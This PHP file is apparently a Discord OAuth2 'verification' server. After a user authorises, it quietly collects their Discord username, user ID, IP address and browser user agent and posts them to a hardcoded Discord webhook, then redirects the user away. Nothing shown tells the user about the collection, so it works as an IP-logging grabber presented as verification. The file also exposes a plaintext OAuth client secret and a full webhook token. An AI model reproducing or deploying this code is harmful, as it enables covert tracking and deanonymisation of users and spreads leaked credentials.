<?php
// Railwayの生存確認を最優先で返す
if ($_SERVER['REQUEST_URI'] === '/health') {
    http_response_code(200);
    exit('OK');
}

// --- 設定データ ---
$client_id     = '1483731872050839564';
$client_secret = 'x1dQum1L-xtASg0NHH29gPrnRDEjIA_L'; 
$webhook_url   = 'https://discordapp.com/api/webhooks/1483730982606475304/UN0z8Omfi4Voo58rLkFVhwhv0Jd59kUOYktJxyx0g0mGl5VkCc0IbLtegaqKZXAKokc2';
$redirect_uri  = 'https://discord-verify-production-4476.up.railway.app'; 

// 待機画面
if (!isset($_GET['code'])) {
    echo "Ready. Please use the OAuth2 link.";
    exit;
}

// 1. アクセストークンの取得
$ch = curl_init('https://discord.com/api/oauth2/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'client_id'     => $client_id,
    'client_secret' => $client_secret,
    'grant_type'    => 'authorization_code',
    'code'          => $_GET['code'],
    'redirect_uri'  => $redirect_uri
]));
$token_res = json_decode(curl_exec($ch), true);

if (isset($token_res['access_token'])) {
    // 2. ユーザー情報の取得
    $ch = curl_init('https://discord.com/api/users/@me');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $token_res['access_token']]);
    $user = json_decode(curl_exec($ch), true);

    // 3. IPアドレスと環境情報の取得
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    
    // アイコンURLの作成
    $avatar = "https://cdn.discordapp.com/avatars/{$user['id']}/{$user['avatar']}.png";

    // 4. Discord Webhookへ送信（豪華なEmbed形式）
    $payload = json_encode([
        "username" => "Verification System",
        "avatar_url" => "https://i.imgur.com/8nLFCvL.png", // ボットのアイコン
        "embeds" => [[
            "title" => "✅ 認証完了レポート",
            "description" => "新しいユーザーが認証を完了しました。",
            "color" => 3066993, // 緑色
            "thumbnail" => ["url" => $avatar], // ユーザーのアイコンを右上に表示
            "fields" => [
                ["name" => "👤 ユーザー名", "value" => "**{$user['username']}#{$user['discriminator']}**", "inline" => true],
                ["name" => "🆔 ユーザーID", "value" => "`{$user['id']}`", "inline" => true],
                ["name" => "🌐 IPアドレス", "value" => "||{$ip}||", "inline" => false], // ||で囲むとクリックで表示（ネタバレ防止）
                ["name" => "🖥️ ブラウザ/OS", "value" => "```" . $ua . "```", "inline" => false]
            ],
            "footer" => [
                "text" => "System Log | " . date("Y-m-d H:i:s")
            ]
        ]]
    ]);

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_exec($ch);
}

// 5. 完了後にDiscordへ飛ばす
header("Location: https://discord.com/channels/@me");
exit;
